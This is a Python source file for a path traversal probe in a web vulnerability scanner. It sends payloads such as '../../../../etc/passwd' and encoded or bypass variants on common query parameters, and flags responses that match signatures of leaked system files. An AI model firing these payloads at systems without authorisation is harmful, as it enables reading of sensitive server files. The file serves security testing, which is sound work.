"""Path Traversal probe — tests for `../../etc/passwd`-style leaks on common parameters."""

from __future__ import annotations

from urllib.parse import urlencode

import requests

from pentra.core.web_probes.base import WebProbeBase
from pentra.i18n import t
from pentra.models import Finding, Severity

_PARAMS_TO_TEST: tuple[str, ...] = (
    "file", "page", "path", "doc", "folder", "root",
    "include", "template", "load", "read", "download",
)

# (match_needle, i18n_key_for_description)
_LEAK_SIGNATURES: tuple[tuple[str, str], ...] = (
    ("root:x:0:0", "label.web.path_traversal.etc_passwd"),
    ("root:/bin/bash", "label.web.path_traversal.etc_passwd"),
    ("[boot loader]", "label.web.path_traversal.boot_ini"),
    ("[fonts]", "label.web.path_traversal.win_ini"),
    ("for 16-bit app support", "label.web.path_traversal.config_sys"),
)

# (payload, os_label_key, os_display_suffix)
_PAYLOADS: tuple[tuple[str, str, str], ...] = (
    ("../../../../etc/passwd", "label.os.linux", ""),
    ("..%2f..%2f..%2f..%2fetc%2fpasswd", "label.os.linux", " (URL-encoded)"),
    ("../../../../windows/win.ini", "label.os.windows", ""),
    ("....//....//....//etc/passwd", "label.os.linux", " (double-dot bypass)"),
)


class PathTraversalProbe(WebProbeBase):
    name: str = "path_traversal"
    description_key: str = "probe.web.path_traversal.description"
    timeout: float = 8.0

    def probe(self, url: str, session: requests.Session) -> list[Finding]:
        findings: list[Finding] = []
        seen_params: set[str] = set()

        for param in _PARAMS_TO_TEST:
            if param in seen_params:
                continue

            for payload, os_key, os_suffix in _PAYLOADS:
                full_url = self._build_url_with_param(url, param, payload)

                try:
                    response = session.get(
                        full_url, timeout=self.timeout, allow_redirects=False,
                    )
                except requests.RequestException:
                    continue

                matched_needle, matched_desc = self._match_leak(response.text)
                if matched_needle:
                    os_hint = t(os_key) + os_suffix
                    findings.append(
                        Finding(
                            scanner_name="web_scanner",
                            severity=Severity.CRITICAL,
                            title=t(
                                "finding.web.path_traversal.title", param=param,
                            ),
                            description=t(
                                "finding.web.path_traversal.desc",
                                param=param,
                                payload=payload,
                                os_hint=os_hint,
                                matched_sig=matched_desc,
                            ),
                            target=full_url,
                            remediation=t(
                                "finding.web.path_traversal.remediation", param=param,
                            ),
                            evidence=self._build_evidence(
                                request_method="GET",
                                request_path=full_url,
                                response_status=response.status_code,
                                response_snippet=response.text[:200],
                                why_vulnerable=matched_desc,
                                extra={"payload": payload, "param": param},
                            ),
                        ),
                    )
                    seen_params.add(param)
                    break

        return findings

    # -----------------------------------------------------------------
    @staticmethod
    def _match_leak(body: str) -> tuple[str | None, str]:
        """Check the response body for evidence of a leak.

        Returns:
            (matched_needle, i18n_translated_description) or (None, "")
        """
        snippet = body[:4096]
        for needle, desc_key in _LEAK_SIGNATURES:
            if needle in snippet:
                return needle, t(desc_key)
        return None, ""

    @staticmethod
    def _build_url_with_param(base_url: str, param: str, payload: str) -> str:
        """Append ?param=payload to base_url (keeping any existing query)."""
        separator = "&" if "?" in base_url else "?"
        encoded = urlencode({param: payload}, safe="%")
        return f"{base_url}{separator}{encoded}"
